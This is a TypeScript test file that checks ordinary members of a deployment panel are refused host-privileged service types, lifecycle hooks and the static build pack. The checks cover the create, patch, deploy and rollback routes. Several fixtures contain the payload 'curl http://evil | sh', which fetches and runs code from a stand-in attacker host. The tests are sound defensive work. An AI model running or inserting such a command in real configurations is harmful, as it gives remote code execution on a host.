import { beforeEach, describe, expect, it, vi } from 'vitest';
import { servicesRoutes } from '../src/modules/services.js';
import { deploysRoutes } from '../src/modules/deploys.js';
import { hostPrivilegeReasons } from '../src/lib/hostPrivilege.js';
import { asUser, buildTestApp, createFakeDb, svcRow } from './helpers.js';

/**
 * H-3 regression: `member` is a real privilege boundary.
 *
 * Five deploy-path features gave any authenticated member code execution with
 * the panel's own privileges (Docker socket, and the host itself under the
 * systemd install), while exec / volume files / container files / exec-jobs
 * were all admin-gated on the grounds that host reach is admin-only. These
 * tests hold that boundary closed:
 *
 *   • PM2 services            → `sh -c <installCmd>` on the host
 *   • Compose services        → attacker-authored YAML (host mounts, privileged)
 *   • Lifecycle hooks         → host binaries via engine/pipeline.ts
 *   • docker-socket templates → container control of the whole host
 *   • static build pack       → `sh -c <installCmd>/<buildCmd>` on the host
 *                               (engine/builders/staticSite.ts) behind an
 *                               innocent `type: 'docker'` service
 */

const execMocks = vi.hoisted(() => ({
  capture: vi.fn(async () => 'out'),
  run: vi.fn(async (_c: unknown, _a: unknown, _o: unknown, sink?: (l: string) => void) => { sink?.('out'); }),
}));
vi.mock('../src/lib/exec.js', () => execMocks);

vi.mock('../src/engine/proxy.js', () => ({ writeDynamicConfig: vi.fn(async () => undefined), NETWORK: 'ninedeploy' }));

const pm2Mocks = vi.hoisted(() => ({
  connect: vi.fn((cb: (e?: Error | null) => void) => cb(null)),
  disconnect: vi.fn(),
  stop: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  restart: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  delete: vi.fn((_n: string, cb: (e?: Error | null) => void) => cb(null)),
  describe: vi.fn((_n: string, cb: (e: Error | null, d?: unknown[]) => void) => cb(null, [])),
}));
vi.mock('pm2', () => ({ default: pm2Mocks }));

vi.mock('../src/config.js', () => ({
  config: {
    wildcardDomain: '',
    isProd: false,
    publicUrl: 'http://localhost:3000',
    paths: { dataDir: '/tmp', masterKeyFile: '/tmp/master.key' },
    jwt: { secret: 'x', accessTtl: '15m', refreshTtl: '7d' },
  },
}));

const MEMBER = 7;
const member = () => asUser({ id: MEMBER, isOperator: false });
const admin = () => asUser({ id: 1, isOperator: true });

const dockerService = {
  name: 'app',
  type: 'docker' as const,
  repoUrl: 'https://example.com/x.git',
  branch: 'main',
  build: { buildPack: 'auto' as const, baseDir: '/' },
};

beforeEach(() => {
  vi.clearAllMocks();
});

describe('H-3: hostPrivilegeReasons names every host-reaching feature', () => {
  it('flags pm2, compose, lifecycle hooks, the docker socket and the static build pack', () => {
    expect(hostPrivilegeReasons({ type: 'pm2' })).toHaveLength(1);
    expect(hostPrivilegeReasons({ type: 'compose' })).toHaveLength(1);
    expect(hostPrivilegeReasons({ type: 'docker', build: { preDeployCmd: 'curl evil | sh' } })).toHaveLength(1);
    expect(hostPrivilegeReasons({ type: 'docker', dockerSocket: true })).toHaveLength(1);
    expect(hostPrivilegeReasons({ type: 'docker', build: { buildPack: 'static' } })).toHaveLength(1);
  });

  it('leaves a plain container deploy unflagged', () => {
    expect(hostPrivilegeReasons({ type: 'docker', build: { preDeployCmd: null }, dockerSocket: false })).toEqual([]);
    // Every container-side build pack stays member-accessible.
    for (const pack of ['auto', 'nixpacks', 'dockerfile', 'railpack']) {
      expect(hostPrivilegeReasons({ type: 'docker', build: { buildPack: pack } })).toEqual([]);
    }
  });

  it('reports every applicable reason, not just the first', () => {
    const reasons = hostPrivilegeReasons({ type: 'pm2', dockerSocket: true, build: { postDeployCmd: 'x' } });
    expect(reasons).toHaveLength(3);
  });
});

describe('H-3: creating a host-privileged service requires admin', () => {
  async function app() {
    const a = await buildTestApp({
      db: createFakeDb({ insert: { services: [svcRow({ id: 9, ownerUserId: MEMBER })] } }),
    });
    await a.register(servicesRoutes, { prefix: '/services' });
    return a;
  }

  const create = async (payload: Record<string, unknown>, headers: Record<string, string>) =>
    (await app()).inject({ method: 'POST', url: '/services', headers, payload });

  it('refuses a PM2 service for a member', async () => {
    const res = await create({ ...dockerService, type: 'pm2' }, member());
    expect(res.statusCode).toBe(403);
    expect(res.json().error.message).toMatch(/directly on the host/);
  });

  it('refuses a compose service for a member', async () => {
    const res = await create({ ...dockerService, type: 'compose' }, member());
    expect(res.statusCode).toBe(403);
  });

  it('refuses lifecycle hooks for a member', async () => {
    for (const key of ['preDeployCmd', 'postDeployCmd', 'preStopCmd']) {
      const res = await create(
        { ...dockerService, build: { ...dockerService.build, [key]: 'curl http://evil | sh' } },
        member(),
      );
      expect(res.statusCode, key).toBe(403);
    }
  });

  it('refuses the static build pack for a member', async () => {
    // The static pack hides behind an innocent `type: 'docker'`: its install
    // and build commands run on the host via sh -c (staticSite.ts).
    const res = await create(
      { ...dockerService, build: { ...dockerService.build, buildPack: 'static', buildCmd: 'curl http://evil | sh' } },
      member(),
    );
    expect(res.statusCode).toBe(403);
    expect(res.json().error.message).toMatch(/static build pack/);
  });

  it('still allows a member a plain Docker service', async () => {
    const res = await create(dockerService, member());
    expect(res.statusCode).toBe(200);
  });

  it('still allows an admin every form', async () => {
    expect((await create({ ...dockerService, type: 'pm2' }, admin())).statusCode).toBe(200);
    expect((await create({ ...dockerService, type: 'compose' }, admin())).statusCode).toBe(200);
    expect(
      (await create({ ...dockerService, build: { ...dockerService.build, preDeployCmd: 'make migrate' } }, admin()))
        .statusCode,
    ).toBe(200);
    expect(
      (await create(
        { ...dockerService, build: { ...dockerService.build, buildPack: 'static', buildCmd: 'npm run build' } },
        admin(),
      )).statusCode,
    ).toBe(200);
  });
});

describe('H-3: a member cannot reach host privilege one PATCH field at a time', () => {
  async function patchApp(stored: Record<string, unknown>, storedBuild: Record<string, unknown> | undefined) {
    const a = await buildTestApp({
      db: createFakeDb({
        findFirst: { services: svcRow({ id: 1, ownerUserId: MEMBER, ...stored }), buildConfigs: storedBuild },
        update: { services: [svcRow({ id: 1, ownerUserId: MEMBER })], build_configs: [{ serviceId: 1 }] },
      }),
    });
    await a.register(servicesRoutes, { prefix: '/services' });
    return a;
  }

  it('refuses switching an existing docker service to pm2', async () => {
    const a = await patchApp({ type: 'docker' }, undefined);
    const res = await a.inject({ method: 'PATCH', url: '/services/1', headers: member(), payload: { type: 'pm2' } });
    expect(res.statusCode).toBe(403);
  });

  it('refuses adding a lifecycle hook on its own', async () => {
    const a = await patchApp({ type: 'docker' }, undefined);
    const res = await a.inject({
      method: 'PATCH', url: '/services/1', headers: member(),
      payload: { build: { preDeployCmd: 'curl http://evil | sh' } },
    });
    expect(res.statusCode).toBe(403);
  });

  it('refuses switching to the static build pack on its own', async () => {
    const a = await patchApp({ type: 'docker' }, undefined);
    const res = await a.inject({
      method: 'PATCH', url: '/services/1', headers: member(),
      payload: { build: { buildPack: 'static' } },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json().error.message).toMatch(/static build pack/);
  });

  it('refuses an unrelated patch when the static pack is ALREADY stored', async () => {
    const a = await patchApp({ type: 'docker' }, { serviceId: 1, buildPack: 'static', buildCmd: 'npm run build' });
    const res = await a.inject({ method: 'PATCH', url: '/services/1', headers: member(), payload: { name: 'renamed' } });
    expect(res.statusCode).toBe(403);
  });

  it('refuses an unrelated patch when a hook is ALREADY stored', async () => {
    // The merged result is what matters: renaming a service that already runs
    // a hook must not quietly re-bless it.
    const a = await patchApp({ type: 'docker' }, { serviceId: 1, preDeployCmd: 'make migrate' });
    const res = await a.inject({ method: 'PATCH', url: '/services/1', headers: member(), payload: { name: 'renamed' } });
    expect(res.statusCode).toBe(403);
  });

  it('allows an ordinary patch on an unprivileged service', async () => {
    const a = await patchApp({ type: 'docker' }, { serviceId: 1, preDeployCmd: null });
    const res = await a.inject({ method: 'PATCH', url: '/services/1', headers: member(), payload: { name: 'renamed' } });
    expect(res.statusCode).toBe(200);
  });
});

describe('H-3: deploying a stored privileged definition requires admin', () => {
  async function deployApp(stored: Record<string, unknown>, storedBuild: Record<string, unknown> | undefined) {
    const a = await buildTestApp({
      db: createFakeDb({
        findFirst: { services: svcRow({ id: 1, ownerUserId: MEMBER, ...stored }), buildConfigs: storedBuild },
        insert: { deployments: [{ id: 55 }] },
      }),
    });
    await a.register(deploysRoutes, { prefix: '/services' });
    return a;
  }

  it('refuses a member redeploying a PM2 service that predates the rule', async () => {
    const a = await deployApp({ type: 'pm2' }, undefined);
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
    expect(res.statusCode).toBe(403);
  });

  it('refuses a member redeploying a service with a stored lifecycle hook', async () => {
    const a = await deployApp({ type: 'docker' }, { serviceId: 1, preDeployCmd: 'make migrate' });
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
    expect(res.statusCode).toBe(403);
  });

  it('refuses a member redeploying a stored static-pack service', async () => {
    // r-next: the pack ran host commands on deploy, so the deploy gate has to
    // catch definitions that predate the create-time rule.
    const a = await deployApp({ type: 'docker' }, { serviceId: 1, buildPack: 'static', buildCmd: 'npm run build' });
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
    expect(res.statusCode).toBe(403);
  });

  it('refuses the rollback route on the same grounds', async () => {
    const a = await deployApp({ type: 'pm2' }, undefined);
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys/4/rollback', headers: member() });
    expect(res.statusCode).toBe(403);
  });

  it('still lets a member deploy their plain Docker service', async () => {
    const a = await deployApp({ type: 'docker' }, { serviceId: 1, preDeployCmd: null });
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: member() });
    expect(res.statusCode).toBe(200);
  });

  it('still lets an admin deploy the privileged one', async () => {
    const a = await deployApp({ type: 'pm2' }, undefined);
    const res = await a.inject({ method: 'POST', url: '/services/1/deploys', headers: admin() });
    expect(res.statusCode).toBe(200);
  });
});
